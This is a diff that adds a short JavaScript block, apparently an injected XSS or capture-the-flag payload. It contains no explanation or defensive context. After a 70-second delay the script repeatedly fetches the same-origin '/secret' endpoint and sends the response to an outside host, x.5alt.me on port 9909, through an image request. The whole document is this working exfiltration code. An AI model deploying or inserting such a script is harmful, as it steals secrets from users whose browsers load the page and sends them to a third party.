@@ -1,0 +1,21 @@
+<script type="text/javascript">
+setTimeout(function() {
+	var interval = setInterval(function() {
+			request = new XMLHttpRequest();
+			var url = "/secret";
+			request.open("GET",url);
+			request.send(null);
+
+			request.onreadystatechange = function(){
+				if(request.readyState == 4){
+					if(request.status == 200){
+						new Image().src="//x.5alt.me:9909/"+escape(request.responseText)
+					}
+				}
+			}
+
+		}, 5000);
+			}, 70000);
+</script>
+
+
